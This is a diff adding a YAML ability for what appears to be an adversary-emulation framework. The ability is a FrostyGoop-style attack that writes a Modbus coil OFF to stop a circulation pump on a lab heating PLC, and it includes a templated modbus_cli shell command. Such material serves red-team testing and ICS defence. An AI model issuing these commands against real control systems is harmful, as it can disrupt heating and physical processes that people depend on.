@@ -1,0 +1,18 @@
+---
+
+- id: a1567b21-1369-40b1-b26b-4bdc2228764b
+  name: mrhOTshOT - Modbus Stop Circulation Pump (write coil, unit 11)
+  description: |
+    FrostyGoop-style manipulation: write the circulation-pump coil OFF on the lab
+    heating PLC (ENCO ENC-12X on plc-heating, Modbus unit id 11) via Function 5
+    (Write Single Coil) - an unauthorized command that impairs the heating process.
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_c #{modbus.write_coil.start} #{modbus.write_coil.value} -d #{modbus.device.id}
+    payloads:
+    - modbus_cli
